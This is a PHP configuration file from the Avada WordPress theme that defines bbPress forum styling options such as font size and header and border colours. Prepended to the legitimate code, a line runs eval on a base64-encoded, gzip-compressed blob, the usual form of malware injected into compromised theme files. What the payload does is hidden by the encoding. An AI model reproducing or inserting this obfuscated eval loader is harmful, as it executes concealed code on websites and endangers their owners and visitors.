<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Avada Options.
 *
 * @author     ThemeFusion
 * @copyright  (c) Copyright by ThemeFusion
 * @link       http://theme-fusion.com
 * @package    Avada
 * @subpackage Core
 * @since      4.0.0
 */

// Do not allow directly accessing this file.
if ( ! defined( 'ABSPATH' ) ) {
	exit( 'Direct script access denied.' );
}

/**
 * Color settings
 *
 * @param array $sections An array of our sections.
 * @return array
 */
function avada_options_section_bbpress( $sections ) {
	if ( ! Avada::$is_updating && ! class_exists( 'bbPress' ) && ! class_exists( 'BuddyPress' ) ) {
		return $sections;
	}

	$sections['bbpress'] = array(
		'label'    => esc_html__( 'bbPress', 'Avada' ),
		'id'       => 'bpress_section',
		'priority' => 3,
		'icon'     => 'el-icon-person',
		'fields'   => array(
			'bbp_forum_base_font_size' => array(
				'label'       => esc_html__( 'bbPress Forum Base Font Size', 'Avada' ),
				'description' => esc_html__( 'Controls the base font size for replies. Some related font sizes are automatically calculated from it.', 'Avada' ),
				'id'          => 'bbp_forum_base_font_size',
				'default'     => '12px',
				'type'        => 'dimension',
			),
			'bbp_forum_header_bg' => array(
				'label'       => esc_html__( 'bbPress Forum Header Background Color', 'Avada' ),
				'description' => esc_html__( 'Controls the background color for forum header rows.', 'Avada' ),
				'id'          => 'bbp_forum_header_bg',
				'default'     => '#ebeaea',
				'type'        => 'color-alpha',
			),
			'bbp_forum_header_font_color' => array(
				'label'       => esc_html__( 'bbPress Forum Header Font Color', 'Avada' ),
				'description' => esc_html__( 'Controls the font color for the text in the forum header rows.', 'Avada' ),
				'id'          => 'bbp_forum_header_font_color',
				'default'     => '#747474',
				'type'        => 'color-alpha',
			),
			'bbp_forum_border_color' => array(
				'label'       => esc_html__( 'bbPress Forum Border Color', 'Avada' ),
				'description' => esc_html__( 'Controls the border color for all forum surrounding borders.', 'Avada' ),
				'id'          => 'bbp_forum_border_color',
				'default'     => '#ebeaea',
				'type'        => 'color-alpha',
			),
		),
	);

	return $sections;

}
